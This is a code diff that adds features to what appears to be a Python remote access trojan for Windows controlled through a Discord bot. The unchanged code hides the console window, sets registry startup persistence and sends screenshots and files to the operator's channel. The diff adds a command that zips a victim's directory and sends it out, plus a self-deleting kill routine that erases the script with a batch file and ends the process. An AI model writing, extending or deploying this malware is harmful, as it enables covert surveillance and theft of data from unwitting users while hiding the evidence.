@@ -15,8 +15,10 @@ import ctypes
 from datetime import timezone, datetime, timedelta
 import winreg as reg
 import sys
+import signal
+import zipfile
 
-if sys.platform == "win32":
+if sys.platform == "win32": 
     # Hide the console window
     ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
@@ -153,6 +155,46 @@ def add_to_startup(app_name="main"):
     reg.CloseKey(open_key)
 
 add_to_startup()
+
+async def self_delete(ctx):
+    try:
+        # Get the current script file path
+        file_path = os.path.abspath(sys.argv[0])
+
+        # Create a batch file to delete the script
+        batch_file = file_path + ".bat"
+        with open(batch_file, "w") as bat:
+            bat.write(f'@echo off\n')
+            bat.write(f'timeout /t 1 /nobreak >nul\n')  # Wait for a few seconds
+            bat.write(f'del "{file_path}"\n')  # Delete the script file
+            bat.write(f'del "%~f0"\n')  # Delete the batch file itself
+
+        # Run the batch file after this script exits
+        await ctx.send(f"{file_path}")
+        subprocess.Popen([batch_file], creationflags=subprocess.CREATE_NO_WINDOW)
+    except Exception as e:
+        print(f"Error scheduling file deletion: {e}")
+
+def kill_process():
+    try:
+        # Kill the current process after a delay to allow file deletion
+        os.kill(os.getpid(), 9)
+    except Exception as e:
+        print(f"Error killing process: {e}")
+        
+def create_zip_archive(folder_path, zip_file_path):
+    try:
+        # Create a zip file
+        with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            # Walk the directory and add files to the zip file
+            for root, dirs, files in os.walk(folder_path):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    # Add file to zip with relative path
+                    zipf.write(file_path, os.path.relpath(file_path, folder_path))
+        print(f"Zip archive created successfully: {zip_file_path}")
+    except Exception as e:
+        print(f"Error creating zip archive: {e}")
     
 @bot.event
 async def on_ready():
@@ -182,9 +224,10 @@ async def screenshot(ctx):
         return
     screenshot = pyautogui.screenshot()
 
-    screenshot.save("screenshot.png")
-    with open("screenshot.png", "rb") as f:
+    screenshot.save("d:/screenshot.png")
+    with open("d:/screenshot.png", "rb") as f:
         await ctx.send("Here is screenshot:", file=discord.File(f))
+    os.remove('d:/screenshot.png')
 
 @bot.command()
 async def key(ctx):
@@ -257,6 +300,35 @@ async def upload(ctx, *, file_path: str):
             await ctx.send(file=discord.File(file, os.path.basename(file_path)))
     except Exception as e:
         await ctx.send(f"An error occurred: {str(e)}")
+        
+@bot.command()
+async def zip(ctx, *, dir_path: str):
+    channel = ctx.channel
+    if mac != channel.name:
+        return
+    try:
+        # Create a zip file
+        with zipfile.ZipFile(os.path.basename("default.zip"), 'w', zipfile.ZIP_DEFLATED) as zipf:
+            # Walk the directory and add files to the zip file
+            for root, dirs, files in os.walk(os.path.basename(dir_path)):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    # Add file to zip with relative path
+                    zipf.write(file_path, os.path.relpath(file_path, os.path.basename(dir_path)))
+        print(f"Zip archive created successfully: {os.path.basename("default.zip")}")
+        with open(os.path.basename("default.zip"), 'rb') as file:
+            await ctx.send(file=discord.File(file, os.path.basename(os.path.basename("default.zip"))))
+        os.remove(os.path.basename("default.zip"))
+        print(f"{os.path.basename("default.zip")} has been removed successfully.")
+        # await ctx.send(file=discord.File(file, os.path.basename("default.zip")))
+    except Exception as e:
+        print(f"Error creating zip archive: {e}")
+        
+@bot.command()
+async def kill(ctx):
+    await self_delete(ctx)
+    kill_process()
+    await ctx.send(f"Successfully dead!")
         
 @bot.command()
 async def gmail(ctx, *, param: str):
